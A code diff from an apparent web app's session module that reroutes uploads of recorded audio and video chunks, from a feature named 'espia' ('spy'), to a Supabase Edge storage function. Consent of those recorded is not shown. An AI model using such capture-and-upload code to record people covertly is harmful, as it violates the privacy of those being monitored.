@@ -2415,11 +2415,8 @@ const Session = (() => {
         try {
           const b64 = await _audioBlobToBase64WH(evt.data);
           const idx = _audioChunkIdx++;
-          // [cero-GAS F4] audio chunk → Edge `espia-chunk` (Storage) vía el helper unificado.
-          await _espiaCliWHPost('subirChunkAudio', {
-            idSesion: _audioSesionId, deviceId: window.WH_CONFIG?.deviceId || 'unknown',
-            tipo: 'audio', idx: idx, audioBase64: b64, mimeType: mimeType
-          });
+          // [CERO-GAS F4] audio chunk → Edge espia-chunk (Storage + registro) en vez de GAS→Drive.
+          await API.espiaSubirChunkEdge({ idSesion: _audioSesionId, tipo: 'audio', idx: idx, ts: Date.now(), audioBase64: b64, mime: mimeType });
         } catch(e) { console.warn('[Audio WH] chunk falló:', e?.message); }
       };
 
@@ -2566,20 +2563,6 @@ const Session = (() => {
         espiaCerrarSesion: 'espia_cerrar_sesion'
       };
       async function _espiaCliWHPost(accion, params) {
-        // [cero-GAS F4] Chunk de media (audio/video/screen) → Edge `espia-chunk` (Storage bucket espia). Antes GAS.
-        if (accion === 'espiaSubirChunk' || accion === 'subirChunkAudio') {
-          try {
-            if (typeof API === 'undefined' || typeof API.espiaSubirChunkEdge !== 'function') return { ok: false };
-            const pp = params || {};
-            const tipo = pp.tipo || 'audio';
-            return await API.espiaSubirChunkEdge({
-              deviceId: pp.deviceId || window.WH_CONFIG?.deviceId || 'unknown', tipo,
-              ts: pp.ts || Date.now(), idx: pp.idx || 0,
-              base64: pp.contenido || pp.audioBase64 || '', mime: pp.mimeType || (tipo === 'audio' ? 'audio/webm' : 'video/webm'),
-              idSesion: pp.sesionId || pp.idSesion || (window._espiaCliWH && window._espiaCliWH.sesionId) || ''
-            });
-          } catch (_) { return { ok: false }; }
-        }
         // Supabase-first: si la acción tiene RPC y el directo está habilitado, va a mos.espia_* (mismo shape {ok,data}).
         const rpc = _ESPIA_RPC[accion];
         if (rpc && window.ESPIA_DIRECTO !== false && typeof API !== 'undefined' && API.espiaRpc) {
@@ -3333,10 +3316,8 @@ const Session = (() => {
                   const blob = new Blob(chunks, { type: mime });
                   const b64 = await _espiaCliWHBlobToB64(blob);
                   if (b64) {
-                    await _espiaCliWHPost('espiaSubirChunk', {
-                      deviceId: deviceIdLocal, tipo: tipoUpload, ts: Date.now(),
-                      contenido: b64, sesionId: window._espiaCliWH?.sesionId || ''
-                    });
+                    // [CERO-GAS F4] video chunk → Edge espia-chunk (Storage) en vez de GAS→Drive.
+                    await API.espiaSubirChunkEdge({ idSesion: window._espiaCliWH?.sesionId || '', deviceId: deviceIdLocal, tipo: 'video', idx: 0, ts: Date.now(), audioBase64: b64, mime: mime });
                   }
                 } catch(_){}
                 chunks.length = 0;
